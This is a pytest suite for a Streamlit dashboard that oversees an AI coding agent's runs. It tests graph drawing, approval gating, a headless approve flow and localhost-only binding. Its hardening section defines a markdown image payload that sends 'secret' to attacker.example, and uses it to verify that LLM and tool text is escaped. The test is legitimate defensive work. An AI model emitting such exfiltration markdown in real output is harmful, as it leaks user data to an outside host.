import asyncio
import json
import re
import tomllib
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src import dashboard
from src.models.state import ProcessStatus, VerificationResult
from src.process.engine import DecisionRequest, StartRequest
from src.process.graph import TRANSITIONS, Step, Terminal
from src.runtime import open_runner
from src.storage.sqlite_store import SqliteStore
from tests.conftest import FIXED_CALC, T0, StateFactory

DASHBOARD = Path(dashboard.__file__)


@pytest.fixture(autouse=True)
def isolated(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """No real .env (cwd has none), no Docker needed, no API key."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("SANDBOX_MODE", "subprocess")
    monkeypatch.delenv("OPENROUTER_API_KEY", raising=False)


def make_script(tmp_path: Path) -> Path:
    script = tmp_path / "script.json"
    script.write_text(
        json.dumps(
            {"planner": [{"steps": ["fix add"]}], "coder": [{"new_content": FIXED_CALC, "rationale": "r"}]}
        )
    )
    return script


def start_mock_run(db: Path, repo: Path, script: Path, run_id: str) -> None:
    async def go() -> None:
        async with open_runner(db, drive=True, mock=True, script=script) as runner:
            await runner.start(
                StartRequest(
                    target_repo_path=str(repo), target_file="calc.py", user_prompt="Fix add()", run_id=run_id
                )
            )

    asyncio.run(go())


# --- pure helpers ---------------------------------------------------------------------------------------


def test_graph_draws_every_transition_of_the_table(make_state: StateFactory) -> None:
    dot = dashboard.build_dot(make_state(), visited=set())
    for t in TRANSITIONS:
        target = t.target.status.value if isinstance(t.target, Terminal) else t.target.value
        assert re.search(rf'"{t.source.value}" -> "{target}" \[label="{re.escape(t.label)}"', dot), t


def test_graph_highlights_the_current_step_and_visited_steps(make_state: StateFactory) -> None:
    state = make_state(status=ProcessStatus.AWAITING_APPROVAL, current_step="approval")
    dot = dashboard.build_dot(state, visited={"plan", "code", "verify"})
    assert f'"approval" [fillcolor="{dashboard.CURRENT}"' in dot
    assert f'"plan" [fillcolor="{dashboard.VISITED}"' in dot
    assert f'"finalize" [fillcolor="{dashboard.IDLE}"' in dot


def test_graph_highlights_the_terminal_outcome(make_state: StateFactory) -> None:
    done = dashboard.build_dot(
        make_state(status=ProcessStatus.COMPLETED, current_step="end"), visited=set(Step)
    )
    assert f'"COMPLETED" [fillcolor="{dashboard.SUCCESS}"' in done
    failed = dashboard.build_dot(make_state(status=ProcessStatus.FAILED, current_step="end"), visited=set())
    assert f'"FAILED" [fillcolor="{dashboard.FAILURE}"' in failed
    assert dashboard.CURRENT not in failed


def test_approve_is_disabled_unless_verification_passed(make_state: StateFactory) -> None:
    def verified(pytest_ok: bool, lint_ok: bool) -> VerificationResult:
        return VerificationResult(
            pytest_passed=pytest_ok, pytest_output="", linter_passed=lint_ok, linter_output=""
        )

    assert dashboard.approve_blocker(make_state(verification=verified(True, True))) is None
    reason = dashboard.approve_blocker(make_state(verification=verified(True, False)))
    assert reason is not None and "ruff" in reason
    assert dashboard.approve_blocker(make_state()) is not None


async def test_load_run_gathers_journal_approvals_metrics_and_cost(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "d.db"
    async with open_runner(db, drive=True, mock=True, script=make_script(tmp_path)) as runner:
        run_id = await runner.start(
            StartRequest(
                target_repo_path=str(git_repo), target_file="calc.py", user_prompt="Fix", run_id="v-1"
            )
        )
        await runner.decide(run_id, DecisionRequest(action="approve", actor="alice"))

    view = await dashboard.load_run(db, "v-1")
    assert view.state.status is ProcessStatus.COMPLETED
    assert [a.actor for a in view.approvals] == ["alice"]
    assert view.events[0].event_type == "run_started" and view.events[-1].event_type == "run_finished"
    assert {m.step_name for m in view.metrics} == {"plan", "code", "verify", "approval", "finalize"}
    assert view.cost_usd == 0.0  # the fake LLM reports no cost


# --- the Streamlit page, headless ----------------------------------------------------------------------


def test_page_lists_the_run_and_approves_it(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "ui.db"
    start_mock_run(db, git_repo, make_script(tmp_path), "ui-1")

    at = AppTest.from_file(str(DASHBOARD), default_timeout=120)
    at.run()
    at.text_input(key="db_path").set_value(str(db)).run()
    assert not at.exception
    assert at.selectbox(key="run_id").value == "ui-1"
    assert any("AWAITING_APPROVAL" in m.value for m in at.markdown)

    at.checkbox(key="mock_llm").check().run()
    at.text_input(key="actor").set_value("alice").run()
    at.button(key="approve").click().run()

    assert not at.exception
    assert any("COMPLETED" in s.value for s in at.success)
    assert (git_repo / "calc.py").read_text() == FIXED_CALC


def test_page_refuses_revise_without_comment(git_repo: Path, tmp_path: Path) -> None:
    db = tmp_path / "ui.db"
    start_mock_run(db, git_repo, make_script(tmp_path), "ui-2")

    at = AppTest.from_file(str(DASHBOARD), default_timeout=120)
    at.run()
    at.text_input(key="db_path").set_value(str(db)).run()
    at.checkbox(key="mock_llm").check().run()
    at.text_input(key="actor").set_value("alice").run()
    at.button(key="revise").click().run()

    assert any("comment" in e.value for e in at.error)
    assert at.selectbox(key="run_id").value == "ui-2"


# --- hardening -------------------------------------------------------------------------------------------

EXFIL = "![x](http://attacker.example/leak?d=secret) [click](http://attacker.example)"
UNESCAPED_LINK = re.compile(r"(?<!\\)!\[|(?<!\\)\]\(")


def test_md_escape_neutralises_images_and_links() -> None:
    escaped = dashboard.md_escape(EXFIL)
    assert not UNESCAPED_LINK.search(escaped)
    assert "attacker\\.example" in escaped  # still readable: escaped characters render as themselves


async def test_page_never_renders_llm_or_tool_text_as_markdown(
    tmp_path: Path, make_state: StateFactory
) -> None:
    db = tmp_path / "evil.db"
    state = make_state(
        run_id="evil-1",
        user_prompt=f"task {EXFIL}",
        status=ProcessStatus.FAILED,
        current_step="end",
        terminal_reason="commit_failed",
        execution_plan=[f"step {EXFIL}"],
        verification=VerificationResult(
            pytest_passed=False, pytest_output="", linter_passed=True, linter_output="", error_summary=EXFIL
        ),
        error_message=f"git said {EXFIL}",
    )
    async with SqliteStore(db) as store:
        await store.save_state(state, T0)

    def render() -> AppTest:
        at = AppTest.from_file(str(DASHBOARD), default_timeout=60)
        at.run()
        at.text_input(key="db_path").set_value(str(db)).run()
        return at

    at = await asyncio.to_thread(render)  # AppTest runs its own event loop
    assert not at.exception
    rendered = [
        e.value
        for kind in ("markdown", "caption", "error", "info", "warning", "success")
        for e in getattr(at, kind)
    ]
    assert any("attacker\\.example" in r for r in rendered)  # the text is shown, as text
    assert not any(UNESCAPED_LINK.search(r) for r in rendered), rendered


def test_dashboard_only_listens_on_localhost() -> None:
    config = tomllib.loads(
        (DASHBOARD.parent.parent / ".streamlit" / "config.toml").read_text(encoding="utf-8")
    )
    assert config["server"]["address"] == "127.0.0.1"
    assert config["browser"]["gatherUsageStats"] is False
